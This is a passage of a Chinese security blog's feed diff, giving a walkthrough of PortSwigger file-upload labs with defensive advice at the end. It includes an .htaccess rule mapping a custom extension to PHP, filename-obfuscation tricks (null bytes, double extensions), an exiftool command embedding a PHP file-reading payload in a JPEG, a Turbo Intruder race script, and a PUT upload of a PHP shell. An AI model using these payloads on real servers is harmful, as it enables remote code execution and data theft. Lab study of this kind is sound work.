+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LoadModule php_module /usr/lib/apache2/modules/libphp.so</span><br><span class="line">    AddType application/x-httpd-php .php</span><br></pre></td></tr></table></figure>
+<p>许多服务器还允许开发人员在个别目录中创建特殊配置文件，以覆盖或添加一个或多个全局设置。例如，Apache 服务器会从名为 <code>.htaccess</code> 的文件中加载特定目录的配置（如果有的话）。</p>
+<p>同样，开发人员可以使用 <code>web.config</code> 文件对 IIS 服务器进行特定目录配置。这可能包括以下指令，在本例中，这些指令允许向用户提供 JSON 文件：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">staticContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mimeMap</span> <span class="attr">fileExtension</span>=<span class="string">&quot;.json&quot;</span> <span class="attr">mimeType</span>=<span class="string">&quot;application/json&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">staticContent</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>网络服务器会使用这类配置文件，但通常不允许使用 HTTP 请求访问它们。不过，你偶尔会发现服务器无法阻止你上传自己的恶意配置文件。在这种情况下，即使你需要的文件扩展名被列入了黑名单，你也可以欺骗服务器将任意的自定义文件扩展名映射到可执行的 MIME 类型。</p>
+<h5 id="Lab：通过扩展黑名单绕过网络外壳上传">Lab：通过扩展黑名单绕过网络外壳上传</h5>
+<p>本实验室包含一个易受攻击的图片上传功能。某些文件扩展名被列入了黑名单，但由于该黑名单配置中的一个基本缺陷，这一防御可被绕过。要解决该实验问题，请上传一个基本的 PHP web shell，然后使用它渗出文件 /home/carlos/secret 的内容。使用实验横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter。</p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        Hint
+    </div>
+    <div class="spoiler-content">
+        <p>You need to upload two different files to solve this lab.</p>
+
+    </div>
+</div>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>直接上传php文件失败，服务采用了黑名单防护机制</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505174128331.png" alt="image-20250505174128331"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>尝试上传Apache的配置文件<code>htaccess</code>，将文件扩展名 <strong><code>.l33t</code></strong> 关联到PHP解析器，，提醒上传成功</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505174603001.png" alt="image-20250505174603001"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>再试上传恶意文件成功</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505175302956.png" alt="image-20250505175302956"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>访问即可获得密码</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505175433671.png" alt="image-20250505175433671"></p>
+<p><strong>代码解释：</strong></p>
+<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .l33t</span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><strong><code>AddType</code></strong>：Apache指令，用于将特定文件扩展名映射到对应的MIME类型。</p>
+</li>
+<li class="lvl-2">
+<p><strong><code>application/x-httpd-php</code></strong>：PHP脚本的MIME类型，告诉服务器使用PHP解析器处理该文件。</p>
+</li>
+<li class="lvl-2">
+<p><strong><code>.l33t</code></strong>：自定义的文件扩展名（通常用于替代常见的 <code>.php</code>）。</p>
+</li>
+</ul>
+<p><strong>作用：</strong></p>
+<ol>
+<li class="lvl-3">
+<p><strong>PHP解析</strong>：所有以 <code>.l33t</code> 结尾的文件会被Apache视为PHP脚本，<strong>其中的PHP代码会被服务器解析执行</strong>。</p>
+</li>
+<li class="lvl-3">
+<p><strong>隐藏技术栈</strong>：通过非标准扩展名（如 <code>.l33t</code>）隐藏网站使用的PHP技术，增加攻击者识别难度（但实际安全提升有限，需配合其他措施）。</p>
+</li>
+</ol>
+<h4 id="混淆文件扩展名">混淆文件扩展名</h4>
+<p>即使是最详尽的黑名单，也有可能被经典的混淆技术绕过。假设验证代码对大小写敏感，无法识别 exploit.pHp 实际上是 .php  文件。如果随后将文件扩展名映射到 MIME 类型的代码对大小写不敏感，这种差异就会使恶意 PHP 文件偷偷通过验证，最终被服务器执行。</p>
+<p>您还可以使用以下技术实现类似的效果：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>提供多种扩展名。根据解析文件名所使用的算法，以下文件可能被解释为 PHP 文件或 JPG 图像：exploit.php.jpg</p>
+</li>
+<li class="lvl-2">
+<p>添加尾部字符。某些组件会删除或忽略尾部空格、点等类似字符： exploit.php.jpg。</p>
+</li>
+<li class="lvl-2">
+<p>尝试使用 URL 编码（或双 URL 编码）来处理点、正斜线和反斜线。如果在验证文件扩展名时未对该值进行解码，但随后在服务器端进行了解码，这样也可以上传恶意文件，否则会被阻止： exploit%2Ephp在文件扩展名前添加分号或 URL 编码的空字节字符。</p>
+</li>
+<li class="lvl-2">
+<p>如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C/C++  等低级函数处理文件，这可能会导致文件名末尾的处理不一致：exploit.asp;.jpg 或 exploit.asp%00.jpg尝试使用多字节 unicode 字符，这些字符可能在 unicode 转换或规范化后被转换为空字节和点。</p>
+</li>
+<li class="lvl-2">
+<p>如果文件名被解析为 UTF-8 字符串，xC0  x2E、xC4 xAE 或 xC0 xAE 等序列可能会被转换为 x2E，但在路径中使用前又会被转换为 ASCII 字符。</p>
+</li>
+</ul>
+<p>其他防御措施包括删除或替换危险的扩展名，以防止文件被执行。如果这种转换不是递归应用的，你可以将禁止的字符串定位在这样一种方式，即删除它仍然会留下一个有效的文件扩展名。例如，如果从以下文件名中删除 .php 会发生什么情况：</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">exploit<span class="selector-class">.p</span>.phphp</span><br></pre></td></tr></table></figure>
+<p>这只是混淆文件扩展名的众多方法中的一小部分。</p>
+<h5 id="Lab：通过混淆文件扩展名上传网络外壳">Lab：通过混淆文件扩展名上传网络外壳</h5>
+<p>该实验室包含一个易受攻击的图片上传功能。某些文件扩展名被列入了黑名单，但可以使用经典的混淆技术绕过这一防御。要解决该实验问题，请上传一个基本的 PHP web shell，然后用它来外泄文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>直接上传失败，提示只能传JPG和PNG</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505184603898.png" alt="image-20250505184603898"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><s>啊，这就过啦</s>   添加后缀，文件的后缀并没有变，考虑添加空字节</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505184818551.png" alt="image-20250505184818551"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>这就可以了</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505214317371.png" alt="image-20250505214317371"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>访问就可以得到密码</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250505214506196.png" alt="image-20250505214506196"></p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        补充
+    </div>
+    <div class="spoiler-content">
+        <ul class="lvl-0">
+<li class="lvl-2">
+<p><code>%00</code> 是 <strong>URL编码的空字符（Null Character）</strong>，对应 ASCII 码中的 <code>0x00</code>。它在计算机系统中通常表示字符串的<strong>结束符</strong>，但在不同场景下可能引发安全问题或功能异常。</p>
+</li>
+<li class="lvl-2">
+<p>旧版PHP（5.3之前）存在空字节阶段漏洞，PHP&gt;=5.3版本中已将其修复</p>
+</li>
+<li class="lvl-2">
+<p>如 PHP 的 <code>basename()</code> 会自动过滤空字符。</p>
+</li>
+<li class="lvl-2">
+<p>在路径遍历在也可以利用 <code>%00</code> 截断路径，访问非授权文件（如 <code>../../secret.log%00</code>）。</p>
+</li>
+<li class="lvl-2">
+<p>大多数 Web 服务器并不是在一开始安装成功后就能执行文件的，像 Apache，要执行 PHP 脚本，需要在 <code>/etc/apache2/apache2.conf</code> 配置文件中添加如下指令加载 php 模块，以及当访问后缀名为 <code>.php</code> 的文件时，作为 php 脚本执行。：</p>
+</li>
+</ul>
+<blockquote>
+<p>LoadModule php_module /usr/lib/apache2/modules/libphp.so<br>
+AddType application/x-httpd-php .php</p>
+</blockquote>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>不止 Apache，Nginx 和 IIS 也都是要做一些配置才能执行脚本。</p>
+<ul class="lvl-2">
+<li class="lvl-4">
+<p>除了 apache2.conf 这个系统级的配置文件，Apache 服务器允许在每个目录下放置一个 <code>.htaccess</code> 文件，在该文件中添加的指令可以覆盖和补充 apache2.conf 的配置。如果应用程序允许上传 <code>.htaccess</code> ，那么就能利用它绕过安全防护，执行代码。</p>
+</li>
+<li class="lvl-4">
+<p>IIS 服务器也有一个类似的配置文件，名为 <code>web.config</code>，它的指令示例：</p>
+<ul class="lvl-4">
+<li class="lvl-6">
+<p>//.json 文件被当成 json 发送给客户端。</p>
+<blockquote>
+<staticContent>
+    <mimeMap fileextension=".json" mimetype="application/json">
+    </mimeMap></staticContent>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+</div>
+<h3 id="文件内容验证存在缺陷">文件内容验证存在缺陷</h3>
+<p>更安全的服务器会尝试验证文件内容是否与预期相符，而不是隐含地信任请求中指定的 <code>Content-Type</code>。</p>
+<p>在图像上传功能中，服务器可能会尝试验证图像的某些固有属性，如尺寸。例如，如果您尝试上传一个 PHP 脚本，它根本不会有任何尺寸。因此，服务器会推断它不可能是图像，并相应地拒绝上传。</p>
+<p>同样，某些文件类型的页眉或页脚可能总是包含特定的字节序列。这些序列就像指纹或签名一样，可用于确定文件内容是否与预期类型相符。例如，JPEG 文件总是以 <code>FF D8 FF</code> 字节开始。</p>
+<p>这是验证文件类型的一种更稳健的方法，但即便如此也并非万无一失。使用 ExifTool 等特殊工具（Exiftool 工具在 kali 系统中已默认安装），可以轻而易举地创建一个在元数据中包含恶意代码的多格式 JPEG 文件。</p>
+<h4 id="Lab-通过多语言网络外壳上传远程执行代码">Lab: 通过多语言网络外壳上传远程执行代码</h4>
+<p>本实验室包含一个易受攻击的图片上传功能。虽然它会检查文件内容以验证其是否为真正的图片，但仍有可能上传并执行服务器端代码。要解决该实验问题，请上传一个基本的 PHP web shell，然后用它来外泄文件 /home/carlos/secret 的内容。使用实验室横幅中提供的按钮提交此秘密。您可以使用以下凭据登录自己的账户：wiener:peter</p>
+<p>这道题web应用对上传的文件头做了校验，如果没有识别到预期的特征码就会报错，这种情况下，可以通过exiftool或其他工具来修改文件元数据，插入脚本生成多态jpeg文件进行绕过 exiftool命令：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>不管是直接上传php脚本，还是尝试其他在之前实验室里用过的技术都已经不行了。</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250506154133865.png" alt="image-20250506154133865"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>创建一个多语 PHP/JPG 文件，该文件从根本上说是一个普通图像，但在元数据中包含了 PHP 有效载荷。一种简单的方法是下载并从命令行运行 ExifTool，将 PHP 有效载荷添加到图片的注释字段，以 .php 扩展名保存图片，然后上传。如下所示：</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exiftool -Comment=<span class="string">&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot;</span> NiuBi.jpg -o polyglot.php</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/34bab347//image-20250506160513314.png" alt="image-20250506160513314"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>将<code>polyglot</code> 上传</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250506160911322.png" alt="image-20250506160911322"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><s>访问就行啦</s>   我靠咋不行，网上的都是jpg，应该是文件格式的问题吧，再用jpg试一下</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250506163353446.png" alt="image-20250506163353446"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>果然可以了。。。网络的世界真是奇妙</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250506163844566.png" alt="image-20250506163844566"></p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        补充
+    </div>
+    <div class="spoiler-content">
+        <ul class="lvl-0">
+<li class="lvl-2">
+<p>exiftool命令的含义</p>
+<ul class="lvl-2">
+<li class="lvl-4"><strong><code>exiftool</code></strong>：一个用于读写文件元数据（如EXIF信息）的命令行工具，常用于处理图片的拍摄参数、注释等。</li>
+<li class="lvl-4"><strong><code>-Comment=&quot;&lt;?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?&gt;&quot;</code></strong>
+<ul class="lvl-4">
+<li class="lvl-6">将JPEG图片的**注释字段（Comment）**修改为一段PHP代码。</li>
+<li class="lvl-6">代码功能：读取服务器上**<code>/home/carlos/secret</code>**文件的内容，并包裹在<code>START</code>和<code>END</code>之间输出。</li>
+</ul>
+</li>
+<li class="lvl-4"><strong><code>-o polyglot.php</code>：<strong>将处理后的文件输出为</strong><code>polyglot.php</code></strong>。生成的文件既是合法图片（保留原JPEG数据），又是PHP脚本（因扩展名为<code>.php</code>且包含可执行代码）。</li>
+</ul>
+</li>
+<li class="lvl-2">
+<p>此题上传的文件为 <code>polyglot.php</code> ，当然大部分服务器是不能上传php文件的，但是如果能采用某些方法将jpg解析为php，这段代码依然是可以执行的</p>
+</li>
+</ul>
+
+    </div>
+</div>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        为什么上传png会失败
+    </div>
+    <div class="spoiler-content">
+        <ol>
+<li class="lvl-3">
+<p><strong>元数据结构的本质差异</strong>：</p>
+<ul class="lvl-2">
+<li class="lvl-5"><strong>JPG（JPEG）</strong>：使用 <strong>EXIF 标准</strong>存储元数据，允许直接将PHP代码写入<code>Comment</code>字段。ExifTool修改后，文件仍保持有效的JPEG结构，同时代码位于可被PHP解析的位置。</li>
+<li class="lvl-5"><strong>PNG</strong>：元数据存储在 <strong>“数据块”（Chunks）</strong> 中（如<code>tEXt</code>、<code>iTXt</code>等）。直接通过<code>-Comment</code>参数注入代码可能破坏PNG文件结构，或代码未存储在服务器会解析的位置。</li>
+</ul>
+</li>
+<li class="lvl-3">
+<p><strong>PHP执行逻辑的差异</strong>：</p>
+<ul class="lvl-2">
+<li class="lvl-5">即使成功注入代码到PNG中，PHP解析器可能不会执行位于PNG数据块中的代码，因为PHP默认从文件开头解析，遇到非PHP标签（如PNG的二进制头<code>‰PNG</code>）会直接终止执行。</li>
+</ul>
+</li>
+<li class="lvl-3">
+<p><strong>服务器对文件扩展名的处理</strong>：</p>
+<ul class="lvl-2">
+<li class="lvl-5">如果上传的PNG文件保留<code>.png</code>扩展名，服务器可能不会调用PHP解析器，即使内容包含PHP代码。而<code>.php</code>扩展名的文件（如你生成的<code>polyglot.php</code>）会被强制用PHP解析。</li>
+</ul>
+</li>
+<li class="lvl-3">
+<p>我按照deepseek给我的方法用png进行了尝试，依然失败了。首先我的PHP代码没能写进去（检查时发现的），然后服务端依然没能解析后缀php的png图片。感觉png的安全性应该是比jpg高的。</p>
+</li>
+<li class="lvl-3">
+<p><strong>总的来说：</strong></p>
+<ul class="lvl-2">
+<li class="lvl-5"><strong>JPG成功</strong>：因其元数据允许直接注入PHP代码，且生成文件扩展名为<code>.php</code>触发服务器解析。</li>
+<li class="lvl-5"><strong>PNG失败</strong>：元数据存储方式不同，且默认扩展名（<code>.png</code>）不触发PHP解析。需调整注入位置或文件结构才能成功。</li>
+</ul>
+</li>
+</ol>
+
+    </div>
+</div>
+<h3 id="利用文件上传竞赛条件">利用文件上传竞赛条件</h3>
+<p>现代框架对此类攻击的防御能力更强。它们通常不会直接将文件上传到文件系统上的目标位置。相反，它们会采取一些预防措施，比如先上传至一个临时的沙盒目录，并随机化名称以避免覆盖现有文件。然后，它们对临时文件进行验证，只有在认为安全后才将文件传输到目的地。</p>
+<p>尽管如此，开发人员有时会独立于任何框架实现自己的文件上传处理。要做好这一点不仅相当复杂，还可能引入危险的竞赛条件，使攻击者能够完全绕过最强大的验证。</p>
+<p>例如，有些网站会将文件直接上传到主文件系统，如果没有通过验证，就会再次删除。这种行为在依赖反病毒软件等检查恶意软件的网站中非常典型。这可能只需要几毫秒，但在文件存在于服务器上的短时间内，攻击者仍有可能执行该文件。</p>
+<p>这些漏洞往往非常隐蔽，因此很难在黑盒测试中发现，除非你能找到泄露相关源代码的方法。</p>
+<p>总的来说啊就是：很多文件上传功能不会先将上传的文件上传到目标位置，而是先送去沙盒化临时目录做检查，并随机化它的名称，看看他是不是恶意文件，然后再传到最终目录。但是有的开发者比较疏忽，把文件传到自己的框架目录对它检查。虽然检查的时间很短，但是黑客依然可能利用短短的几毫秒时间搞事情。</p>
+<p>另外，还有一种情况可能发生条件竞争文件上传漏洞，就是让用户提供一个 URL 来保存文件，这一般只能由开发人员自己编写处理程序，也必须先下载一份文件副本到本地，然后再做安全性验证，所以这种情况很容易出现漏洞。如果上传的文件或通过 URL 下载的文件保存到一个具有随机名称的临时目录，这一般不太可能被攻击者知道，但如果临时目录是伪随机数，那么仍然有可能被攻击者用暴力破解的方法知道。</p>
+<p>为了让条件竞争上传文件的攻击更容易，攻击者会上传一个恶意的大文件，里面填充大量无用字符，但不会影响到里面的代码被执行，应用程序处理这类大文件会处理得更久，那么文件在文件系统上停留的时间更久，也就更容易被攻击者趁机访问。</p>
+<h4 id="Lab：-通过竞赛条件上传网络外壳">Lab： 通过竞赛条件上传网络外壳</h4>
+<p>该实验室包含一个易受攻击的图片上传功能。虽然它对上传的任何文件都执行了稳健的验证，但利用其处理文件方式中的竞赛条件，完全可以绕过验证。引入这一竞赛条件的脆弱代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//存储目标文件夹名 &#x27;avatars/&#x27;</span></span><br><span class="line"><span class="variable">$target_dir</span> = <span class="string">&quot;avatars/&quot;</span>;</span><br><span class="line"><span class="comment">//$target_file 是最终保存文件的路径。</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;name&quot;] 是用户上传文件的原始名字（比如用户上传的文件叫 cat.jpg，这里就是 cat.jpg）。</span></span><br><span class="line"><span class="variable">$target_file</span> = <span class="variable">$target_dir</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// temporary move</span></span><br><span class="line"><span class="comment">//$_FILES[&quot;avatar&quot;][&quot;tmp_name&quot;] 是文件上传到服务器后的临时存储路径（比如 &#x27;/tmp/php123.tmp&#x27;）。</span></span><br><span class="line"><span class="comment">//move_uploaded_file 的作用是将临时文件移动到目标路径 $target_file。</span></span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;avatar&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果文件通过了病毒检查(checkViruses)和文件类型检查(checkFileType)，显示上传成功；否则删除文件，显示错误。</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">checkViruses</span>(<span class="variable">$target_file</span>) &amp;&amp; <span class="title function_ invoke__">checkFileType</span>(<span class="variable">$target_file</span>)) &#123;</span><br><span class="line">    <span class="comment">//htmlspecialchars：防止文件名中的特殊字符引发安全问题（比如 &lt;script&gt; 这类代码）。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span>. <span class="title function_ invoke__">htmlspecialchars</span>( <span class="variable">$target_file</span>). <span class="string">&quot; has been uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$target_file</span>);<span class="comment">//删除文件。</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);<span class="comment">//返回“禁止访问”的状态码。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkViruses</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// checking for viruses</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//检查文件扩展名（后缀）是否是 jpg 或 png。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileType</span>(<span class="params"><span class="variable">$fileName</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//pathinfo($fileName, PATHINFO_EXTENSION)：提取文件名的后缀（比如 cat.jpg 提取出 jpg）。</span></span><br><span class="line">    <span class="comment">//strtolower：将后缀转为小写（防止 JPG 和 jpg 不一致）。</span></span><br><span class="line">    <span class="variable">$imageFileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$fileName</span>,PATHINFO_EXTENSION));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$imageFileType</span> != <span class="string">&quot;jpg&quot;</span> &amp;&amp; <span class="variable">$imageFileType</span> != <span class="string">&quot;png&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, only JPG &amp; PNG files are allowed\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><font class="notice">注：我php太菜，直接上注释了</font></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>首先上传图片，然后添加路径访问图片，确保访问路径正确</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250507101849368.png" alt="image-20250507101849368"></p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>然后构造Tburbo Intruder文件上传竞赛脚本进行攻击，脚本如下</p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">queueRequests</span>(<span class="params">target, wordlists</span>):</span><br><span class="line">    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=<span class="number">10</span>,)</span><br><span class="line"></span><br><span class="line">    request1 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-POST-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    request2 = <span class="string">&#x27;&#x27;&#x27;&lt;YOUR-GET-REQUEST&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># the &#x27;gate&#x27; argument blocks the final byte of each request until openGate is invoked</span></span><br><span class="line">    engine.queue(request1, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        engine.queue(request2, gate=<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait until every &#x27;race1&#x27; tagged request is ready</span></span><br><span class="line">    <span class="comment"># then send the final byte of each request</span></span><br><span class="line">    <span class="comment"># (this method is non-blocking, just like queue)</span></span><br><span class="line">    engine.openGate(<span class="string">&#x27;race1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    engine.complete(timeout=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handleResponse</span>(<span class="params">req, interesting</span>):</span><br><span class="line">    table.add(req)</span><br></pre></td></tr></table></figure>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>将request1设置为上传php代码的包，将request2设置为上传的php代码的路径。</p>
+</li>
+</ul>
+<p><img src="/posts/34bab347//image-20250507102639395.png" alt="image-20250507102639395"></p>
+<h4 id="基于-URL-的文件上传中的竞赛条件">基于 URL 的文件上传中的竞赛条件</h4>
+<p>在允许您通过提供 URL 上传文件的函数中，也会出现类似的竞赛条件。在这种情况下，服务器必须通过互联网获取文件并创建本地副本，然后才能执行任何验证。</p>
+<p>由于文件是使用 HTTP 加载的，开发人员无法使用框架的内置机制来安全地验证文件。相反，他们可能会手动创建自己的流程来临时存储和验证文件，但这样可能不太安全。</p>
+<p>例如，如果文件被加载到一个名称随机的临时目录中，理论上攻击者就不可能利用任何竞赛条件。如果攻击者不知道目录名，就无法请求文件以触发文件的执行。另一方面，如果使用伪随机函数（如 PHP 的 uniqid()）生成随机目录名，就有可能被暴力破解。</p>
+<p>为了让这种攻击更容易得手，可以尝试延长处理文件的时间，从而延长暴力破解目录名的时间窗口。一种方法是上传较大的文件。如果文件是分块处理的，你就有可能利用这一点，创建一个恶意文件，在文件开头添加有效载荷，然后添加大量任意填充字节。</p>
+<h2 id="利用文件上传漏洞而不执行远程代码">利用文件上传漏洞而不执行远程代码</h2>
+<p>在我们迄今为止看过的示例中，我们可以上传服务器端脚本以远程执行代码。这是文件上传功能不安全造成的最严重后果，但这些漏洞仍然可以通过其他方式被利用。</p>
+<h3 id="上传恶意客户端脚本">上传恶意客户端脚本</h3>
+<p>虽然您可能无法在服务器上执行脚本，但您仍然可以上传脚本进行客户端攻击。例如，如果可以上传 HTML 文件或 SVG 图像，就有可能使用 &lt;script&gt; 标记创建存储的 XSS 有效载荷。</p>
+<p>如果上传的文件出现在其他用户访问的页面上，他们的浏览器在尝试呈现页面时就会执行脚本。请注意，由于同源策略的限制，这类攻击只有在上传的文件和您上传文件的同一源提供时才会起作用。</p>
+<p>能上传带有恶意代码的文件是最严重的漏洞，这是针对服务器的攻击，但文件上传也能用于针对客户端攻击。上传一个 HTML  文件或 SVG 图像，里面包含 XSS 代码，那么就相当于是一个存储型 XSS 漏洞了，然后把文件的 URL  发给受害者，因为域名是合法的，所以更容易被信任。（注意，上传的文件如果被保存到另一个网站，那么要考虑同源策略的影响）</p>
+<h3 id="使用-PUT-上传文件">使用 PUT 上传文件</h3>
+<p>值得注意的是，某些网络服务器可能被配置为支持 PUT 请求。如果没有适当的防御措施，即使网络接口没有上传功能，也可以通过这种方式上传恶意文件。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PUT /images/exploit.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line">Content-Length: <span class="number">49</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/path/to/file&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Tip">Tip</h3>
+<p>您可以尝试向不同的端点发送 OPTIONS 请求，以测试是否有任何端点宣布支持 PUT 方法。</p>
+<h2 id="如何防止文件上传漏洞">如何防止文件上传漏洞</h2>
+<p>允许用户上传文件已是司空见惯的事情，只要采取正确的预防措施，就不会有什么危险。一般来说，保护自己的网站免受这些漏洞攻击的最有效方法是实施以下所有做法：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>对照允许扩展名的白名单而不是禁止扩展名的黑名单检查文件扩展名。猜测你可能希望允许哪些扩展名要比猜测攻击者可能试图上传哪些扩展名容易得多。</p>
+</li>
+<li class="lvl-2">
+<p>确保文件名不包含任何可能被解释为目录或遍历序列（…/）的子串。</p>
+</li>
+<li class="lvl-2">
+<p>重新命名上传的文件，避免可能导致现有文件被覆盖的碰撞。</p>
+</li>
+<li class="lvl-2">
+<p>在完全验证之前，不要将文件上传到服务器的永久文件系统。</p>
+</li>
+<li class="lvl-2">
+<p>尽可能使用已建立的框架来预处理文件上传，而不是尝试编写自己的验证机制。</p>
+</li>
+</ul>
 <p>本文参考：</p>
+<p><a href="https://blog.csdn.net/shawdow_bug/article/details/140149569">【Portswigger 学院】文件上传</a></p>
 <link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
       <categories>
-        <category>靶场练习</category>
-        <category>Pikachu靶场</category>
+        <category>渗透测试</category>
+        <category>文件上传</category>
       </categories>
+      <tags>
+        <tag>PortSwigger靶场</tag>
+        <tag>文件上传</tag>
+      </tags>
   </entry>
   <entry>
     <title>【安全工具】sqlmap</title>
@@ -6018,6 +7235,191 @@ AddType application/x-httpd-php .php</p>
       <categories>
         <category>靶场练习</category>
         <category>PortSwigger靶场</category>
+      </categories>
+      <tags>
+        <tag>PortSwigger靶场</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>【PortSwigger学院】SQL 注入</title>
+    <url>/posts/3b7c6011/</url>
+    <content><![CDATA[<h2 id="SQL注入漏洞语句允许检索隐藏数据的位置">SQL注入漏洞语句允许检索隐藏数据的位置</h2>
+<p>这个是查看隐藏数据的漏洞，比较简单。通过BurpSuite直接拦截修改就行。</p>
